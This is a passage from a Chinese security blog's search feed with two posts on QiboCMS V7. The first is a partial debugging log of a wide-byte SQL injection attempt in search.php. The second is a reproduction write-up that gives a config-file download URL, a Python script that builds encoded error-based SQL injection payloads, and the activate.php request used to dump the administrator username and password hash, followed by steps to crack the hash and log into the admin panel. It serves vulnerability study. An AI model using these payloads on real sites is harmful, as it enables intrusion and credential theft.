class="hljs-string">&quot;\%&quot;</span>,<span class="hljs-variable">$keyword</span>);<br></code></pre></td></tr></table></figure><p>发现我们注释符号<code>--</code> 后面的空格被吞掉了，那就在%20后面随意加个，改成：<code>--%20p</code></p><p>上面调试过程中发现有这么一行：</p><p><img src="/img/qibocms-thinking/Untitled%204.png"></p><p>那么我们就可以使用宽字节%df进行绕过（这里是个大坑，但此时还没意识到），进入到query函数发现我们成功让sql语句闭合：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">SELECT B.aid FROM qb_keywordid B LEFT JOIN qb_keyword A ON A.<span class="hljs-built_in">id</span>=B.<span class="hljs-built_in">id</span> WHERE A.keywords=<span class="hljs-string">&#x27;運&#x27;</span> and (updatexml(1,concat(0x7e,(substring((select username from qb_memberdata <span class="hljs-built_in">where</span> groupid=3),1,32))),1)) -- p<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/img/qibocms-thinking/Untitled%205.png"></p><p>把语句放到phpmyadmin中看看是否能返回我们想要的结果，这里构造的sql语句是使用updatexml报出后台管理员用户名，发现我们的sql语句是没有问题的。</p><p><img src="/img/qibocms-thinking/Untitled%206.png"></p><p>那我们不是离胜利非常接近了？（并不，接着往下看）</p><h3 id="定位："><a href="#定位：" class="headerlink" title="定位："></a>定位：</h3><p>奇怪的地方来了，这个resource id是什么？$query不应该返回False才对嘛？</p><p><img src="/img/qibocms-thinking/Untitled%207.png"></p><p>查了一下mysql_query()得到以下两个结果：看来我们的情况是有红线的这边。</p><p><img src="/img/qibocms-thinking/Untitled%208.png"></p><p>来源：<a href="https://www.php.net/manual/en/function.mysql-query.php">https://www.php.net/manual/en/function.mysql-query.php</a></p><p><img src="/img/qibocms-thinking/Untitled%209.png"></p><p>来源：<a href="https://blog.csdn.net/weixin_30896511/article/details/95709013">https://blog.csdn.net/weixin_30896511&#x2F;article&#x2F;details&#x2F;95709013</a></p><p>因为我们的$method是空，所以只能运行mysql_query()，看来报错注入的方法行不通了，接着往下看看：</p><p><img src="/img/qibocms-thinking/Untitled%2010.png"></p><p><img src="/img/qibocms-thinking/Untitled%2011.png"></p><p>发现有mysql_fetch_array()那我们正常注入是不是可以呢？立马试一下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://127.0.0.1/qibocms-v7/do/search.php?<span class="hljs-built_in">type</span>=keyword&amp;keyword=%<span class="hljs-built_in">df</span>%27%20union%20select%20username%20from%20qb_memberdata%20where%20groupid=3%20--%20p<br></code></pre></td></tr></table></figure><p><img src="/img/qibocms-thinking/Untitled%2012.png"></p><p>这是怎么回事，怎么$array是空呢？</p><p>检查发现我们构造的sql语句没问题</p><p><img src="/img/qibocms-thinking/Untitled%2013.png"></p><p>然后自己用<code>mysql_connect() mysql_select_db() mysql_query() mysql_fetch_array()</code>这些函数，尽量贴近齐博cms的原本代码，连一下齐博cms的数据库，看看是否可以正常返回：</p><p><img src="/img/qibocms-thinking/Untitled%2014.png"></p><p>发现没有问题。那么就排除了<code>mysql_fetch_array()</code>的问题，只把产生问题的地方定位在query()函数这里：</p><p><img src="/img/qibocms-thinking/Untitled%2015.png"></p><h3 id="排查："><a href="#排查：" class="headerlink" title="排查："></a>排查：</h3><p>接下来我们把自己写的，没有问题的那些代码放到query()里面执行，结果发现居然也没有Array，然后我们开始改造sql语句，看看正常sql语句能否执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">原本的：<span class="hljs-variable">$sqll</span> = <span class="hljs-string">&quot;SELECT B.aid FROM qb_keywordid B LEFT JOIN qb_keyword A ON A.id=B.id WHERE A.keywords=&#x27;運&#x27; union select username from qb_memberdata where groupid=3 -- p&#x27;&quot;</span>;<br>改造一：<span class="hljs-variable">$sqll</span> = <span class="hljs-string">&quot;select username from qb_memberdata where groupid=3&quot;</span>;<br>改造二：<span class="hljs-variable">$sqll</span> = <span class="hljs-string">&quot;select 1 and 1=2 union select username from qb_memberdata where groupid=3&quot;</span>;<br>改造三：<span class="hljs-variable">$sqll</span> = <span class="hljs-string">&quot;SELECT B.aid FROM qb_keywordid B LEFT JOIN qb_keyword A ON A.id=B.id WHERE A.keywords=&#x27;&#x27; union select username from qb_memberdata where groupid=3 -- p&#x27;&quot;</span><br></code></pre></td></tr></table></figure><p>结果出来了，除了原本的其他改造sql语句全部能执行，这就说明是我们的宽字节闭合出问题了，再确认一下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$sqll</span> = <span class="hljs-string">&quot;SELECT B.aid FROM qb_keywordid B LEFT JOIN qb_keyword A ON A.id=B.id WHERE A.keywords=&#x27;好&#x27; union select username from qb_memberdata where groupid=3 -- p&#x27;&quot;</span>;<br></code></pre></td></tr></table></figure><p>发现执行正常，为什么我们看到dbcharset&#x3D;gbk，使用宽字节闭合时会出错呢？在query()中有连接数据库的函数connect()，跟进看一下发生了什么（之前调试都会跳过它，以为只是进行数据库连接，并没有其他用处），结果发现了下面的代码。</p><p><img src="/img/qibocms-thinking/Untitled%2016.png"></p><p>赶紧看一下我们的数据库版本，发现是5.5，所以说，宽字节闭合sql语句发生了错误，再看看mysql5.1版本是什么时候发行的，发现是2008年，哎。</p><h2 id="大疑问"><a href="#大疑问" class="headerlink" title="大疑问"></a>大疑问</h2><p>那为什么我们模拟齐博cms源代码，也没有设定连接时必须是gbk，为什么执行时没有出错呢？</p><p>现在把重点放到这个代码上：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql_query(<span class="hljs-string">&quot;SET sql_mode=&#x27;&#x27;&quot;</span>)<br></code></pre></td></tr></table></figure><p>这里是空的，也就是并没有定义MySQL应该支持的sql语法，对数据的校验等等，具体什么设置，可以参考；<a href="https://segmentfault.com/a/1190000005936172">https://segmentfault.com/a/1190000005936172</a></p><h3 id="小解答："><a href="#小解答：" class="headerlink" title="小解答："></a>小解答：</h3><p>那么这是怎么回事呢？有一种可能就是我们模拟时默认编码是utf8，mysql字符集也是utf8，所以没有问题，如果不设置mysql接收gbk，那么连接时齐博cms发送的是gbk，但是mysql只接收utf8，所以出错了。</p><p>通过这句话，我们就可以设置mysql接收gbk了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql_query(<span class="hljs-string">&quot;SET NAMES &#x27;<span class="hljs-variable">$dbcharset</span>&#x27;&quot;</span>);<br></code></pre></td></tr></table></figure><p>怎么把这句话放到我们的sql语句中呢？如果可以执行多行sql语句，那不就是堆叠注入了嘛？但是没有mysqli_multi_query()，所以无法实现。</p><div class="note note-success">            <p>最后</p>          </div><p>这些是目前的一些想法，还有很多的不足，师傅们请多指教。</p>]]></content>
    
    
    <categories>
      
      <category>代码审计思考</category>
      
      <category>qibocms</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>齐博CMS-SQL注入</title>
    <link href="/2022/07/12/qibocms-sql/"/>
    <url>/2022/07/12/qibocms-sql/</url>
    
    <content type="html"><![CDATA[<h2 id="前期工作"><a href="#前期工作" class="headerlink" title="前期工作"></a>前期工作</h2><h3 id="确认目标存在路径："><a href="#确认目标存在路径：" class="headerlink" title="确认目标存在路径："></a>确认目标存在路径：</h3><figure class="highlight bash"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs bash">/do/activate.php<br></code></pre></td></tr></table></figure><h3 id="配置文件下载"><a href="#配置文件下载" class="headerlink" title="配置文件下载:"></a>配置文件下载:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/do/job.php?job=download&amp;url=ZGF0YS9jb25maWcucGg8<br></code></pre></td></tr></table></figure><h3 id="查找配置文件中的相关内容"><a href="#查找配置文件中的相关内容" class="headerlink" title="查找配置文件中的相关内容:"></a>查找配置文件中的相关内容:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">webdb[<span class="hljs-string">&#x27;mymd5&#x27;</span>]<br></code></pre></td></tr></table></figure><h3 id="如果配置文件无法下载"><a href="#如果配置文件无法下载" class="headerlink" title="如果配置文件无法下载"></a>如果配置文件无法下载</h3><p>mymd5值获取方法可以参考其他师傅的：<a href="https://xz.aliyun.com/t/2879">先知：QiboCMS从SQL注入到getshell</a></p><h2 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h2><h3 id="payload脚本："><a href="#payload脚本：" class="headerlink" title="payload脚本："></a>payload脚本：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/usr/bin/env python3</span><br><span class="hljs-comment"># _*_ coding:utf-8 _*_</span><br>import <span class="hljs-built_in">base64</span><br>import hashlib<br><br><br>def sec_md5(input):<br>    md5 = hashlib.md5(str.encode(input))<br>    md5res = md5.hexdigest()<br>    <span class="hljs-built_in">return</span> md5res<br><br><br>def check_mymd5(mymd5,string):<br>    secret_string = mymd5+<span class="hljs-string">&#x27;5*j,.^&amp;;?.%#@!&#x27;</span><br>    md5code = sec_md5(string)[8:18]<br>    md5str = md5code + secret_string<br>    key = sec_md5(md5str)<br>    keylen = len(key)<br>    strlen = len(string)<br><br>    code = <span class="hljs-string">&#x27;&#x27;</span><br>    i = 0<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(strlen):<br>        k = i % keylen<br>        ASCstr = ord(string[i])<br>        ASCkey = ord(key[k])<br>        code += chr(ASCstr ^ ASCkey)<br>        i+=1<br><br>    code = str(base64.b64encode(code.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)),encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)+md5code<br>    <span class="hljs-built_in">return</span> code<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment">#这里选择使用updateXML还是floor获取用户名</span><br>    <span class="hljs-comment">#updateXML</span><br>    <span class="hljs-comment">#string = &quot;&#x27; and (updatexml(1,concat(0x7e,(substring((select username from qb_memberdata where groupid=3),1,32))),1))#&quot;</span><br>    <span class="hljs-comment">#floor</span><br>    <span class="hljs-comment">#string = &quot;&#x27; and (select 1 from (select count(*),concat(0x7e,(select username from qb_memberdata where groupid=3),0x7e,floor(rand(0)*2))x from information_schema.tables group by x)a)#&quot;</span><br><br>    <span class="hljs-comment">#这里选择使用updateXML还是floor获取密码，注意修改语句中的用户名</span><br>    <span class="hljs-comment">#updateXML</span><br>    <span class="hljs-comment">#string = &quot;&#x27; and (updatexml(1,concat(0x7e,(substring((select password from qb_members where username=&#x27;admin&#x27;),1,32)),0x7e),1))#&quot;</span><br>    <span class="hljs-comment">#floor</span><br>    <span class="hljs-comment">#string = &quot;&#x27; and (select 1 from (select count(*),concat((select password from qb_members where username=&#x27;admin&#x27;),floor(rand(0)*2))x from information_schema.tables group by x)a)#&quot;</span><br><br><br>    <span class="hljs-comment">#每个网站的mymd5都不一样，记得换</span><br>    mymd5 = <span class="hljs-string">&#x27;******&#x27;</span><br>    <span class="hljs-built_in">print</span>(check_mymd5(mymd5, string))<br></code></pre></td></tr></table></figure><h3 id="访问目标漏洞地址"><a href="#访问目标漏洞地址" class="headerlink" title="访问目标漏洞地址"></a>访问目标漏洞地址</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">GET /do/activate.php?job=activate&amp;md5_id=[payload脚本]<br></code></pre></td></tr></table></figure><p>下图红框中的部分就是我们要找的明文username</p><p><img src="/img/qibocms-sql/qibocms-sql-01.png"></p><p>使用同样的方法获取password，然后md5解密，之后找到后台地址登陆就可以了，后台默认路径：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/admin/index.php<br></code></pre></td></tr></table></figure><p><img src="/img/qibocms-sql/qibocms-sql-02.jpg"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="复现环境：qibocms-V7"><a href="#复现环境：qibocms-V7" class="headerlink" title="复现环境：qibocms-V7"></a>复现环境：qibocms-V7</h3><p>这里解释一下为什么payload中查找用户名会写：select username from qb_memberdata where groupid&#x3D;3<br>我们装好环境后可以看到：<br><img src="/img/qibocms-sql/qibocms-sql-05.jpg"></p><h3 id="代码调试"><a href="#代码调试" class="headerlink" title="代码调试"></a>代码调试</h3><p><img src="/img/qibocms-sql/qibocms-sql-03.jpg"><br>漏洞点在这里，我们可以根据这个路径 &#x2F;do&#x2F;activate.php?job&#x3D;activate&amp;md5_id&#x3D;$md5_id 看一下具体代码</p><p>大概梳理了一下，路径是这样的：</p><p>activate-&gt;mymd5-&gt;get_allInfo-&gt;get_passport-&gt;get_one-&gt;query-&gt;Err</p><div class="note note-success">            <p>activate</p>          </div><p><img src="/img/qibocms-sql/qibocms-sql-04.jpg"></p><p>当我们输入：&#x2F;do&#x2F;activate.php?job&#x3D;activate&amp;md5_id&#x3D;payload脚本，进入activate后首先调用了mymd5函数</p><div class="note note-success">            <p>mymd5</p>          </div><p><img src="/img/qibocms-sql/qibocms-sql-06.jpg"></p><p>这里需要注意蓝色的那一行，我们在脚本中是这样写的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aaa<span class="hljs-string">&#x27; and (updatexml(1,concat(0x7e,(substring((select username from qb_memberdata where groupid=3),1,32)),0x7e),1))#</span><br></code></pre></td></tr></table></figure><p>aaa并不重要，可以删掉，但是0x7e很重要，一个就够了。它生成的payload脚本是这样的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">FxNQDFIQHEZFVVZHUBwIWhtXHAcOAAAAU1VSgcBFE5DRlMRQkJdXVIZH0BQCABVR0ZFFwQQX1dYAEVUQgtVRkFRbg9TXVZWR1VWR1REEl5WFFVEBhBeQ0UMAQ8DTRRXHAADSx8ZGAIcGBQ=10342945bb<br></code></pre></td></tr></table></figure><p>裁剪过后可以保障我们payload的完整性。</p><p><img src="/img/qibocms-sql/qibocms-sql-07.jpg"></p><p>经过mymd5函数的处理，可以看到脚本内容被还原了</p><div class="note note-success">            <p>get_allInfo</p>          </div><p><img src="/img/qibocms-sql/qibocms-sql-08.jpg"></p><p>这里把还原的脚本赋值给username，然后开始运行函数get_allInfo</p><div class="note note-success">            <p>get_passport</p>          </div><p><img src="/img/qibocms-sql/qibocms-sql-09.jpg"></p><p>可以看到get_allInfo调用了函数get_passport，跟进看一下</p><div class="note note-success">            <p>get_one</p>          </div><p><img src="/img/qibocms-sql/qibocms-sql-10.jpg"></p><p>发现简单赋值和拼接后，调用了函数get_one</p><p><img src="/img/qibocms-sql/qibocms-sql-11.jpg"></p><div class="note note-success">            <p>query</p>          </div><p>这里就是准备执行我们sql语句的地方了，我们跟进query函数</p><p><img src="/img/qibocms-sql/qibocms-sql-12.jpg"><br><img src="/img/qibocms-sql/qibocms-sql-13.jpg"></p><p>query函数连接了数据库，updateXML开始发挥作用（当Xpath路径语法错误时，就会报错，错误路径内容中的sql语句会被执行），报错的信息会通过SQLlink进行传输（目前是这么理解的）</p><p>UpdateXML语法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">UpdateXML(xml_target, xpath_expr, new_xml)<br>xml_target:： 需要操作的xml<br>xpath_expr： 需要更新的xml路径(Xpath格式)<br>new_xml： 新的xml<br></code></pre></td></tr></table></figure><p><img src="/img/qibocms-sql/qibocms-sql-14.jpg"><br><img src="/img/qibocms-sql/qibocms-sql-16.jpg"></p><p>这里get_one接收了返回值，并把返回的结果null一路返回到了active，接下来就是用Err函数报错，跟进看一下</p><div class="note note-success">            <p>Err</p>          </div><p><img src="/img/qibocms-sql/qibocms-sql-17.jpg"></p><p>通过SQLlink把报错的内容传输出来，可以看到直接将报错结果输出了</p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
      <category>qibocms</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
